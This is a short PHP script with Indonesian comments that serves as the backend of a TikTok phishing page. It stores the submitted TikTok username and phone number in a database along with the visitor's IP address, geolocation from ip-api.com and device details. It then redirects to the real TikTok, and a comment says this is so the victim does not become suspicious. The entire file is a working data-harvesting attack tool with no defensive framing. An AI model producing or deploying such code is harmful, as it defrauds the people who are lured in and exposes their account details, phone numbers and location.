<?php 
include 'db.php';

$ip        = $_SERVER['REMOTE_ADDR'];
$agent     = $_SERVER['HTTP_USER_AGENT'];
$datetime  = date("Y-m-d H:i:s");

// Tangkap data dari form
$tiktok_username = $_POST['tiktok_username'] ?? '';
$phone_number    = $_POST['phone_number'] ?? '';

// Gunakan API ip-api.com untuk mendeteksi lokasi berdasarkan IP
$details = json_decode(file_get_contents("http://ip-api.com/json/$ip"));
$country = $details->country ?? 'Unknown';
$city    = $details->city ?? 'Unknown';
$tz      = $details->timezone ?? 'Unknown';

// Cek sistem operasi dan browser
function getDevice($agent) {
    if (preg_match('/mobile/i', $agent)) return "Mobile - $agent";
    if (preg_match('/linux/i', $agent)) return "Linux - $agent";
    if (preg_match('/mac/i', $agent)) return "Mac - $agent";
    if (preg_match('/windows/i', $agent)) return "Windows - $agent";
    return "Unknown - $agent";
}
$os_browser = getDevice($agent);

// Simpan ke database (pastikan kolom sudah ada!)
$stmt = $conn->prepare("INSERT INTO logs (ip_address, user_agent, country, city, timezone, os_browser, access_time, tiktok_username, phone_number) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");
$stmt->bind_param("sssssssss", $ip, $agent, $country, $city, $tz, $os_browser, $datetime, $tiktok_username, $phone_number);
$stmt->execute();
$stmt->close();
$conn->close();

// Redirect ke TikTok asli agar korban tidak curiga
header("Location: https://www.tiktok.com");
exit;
?>
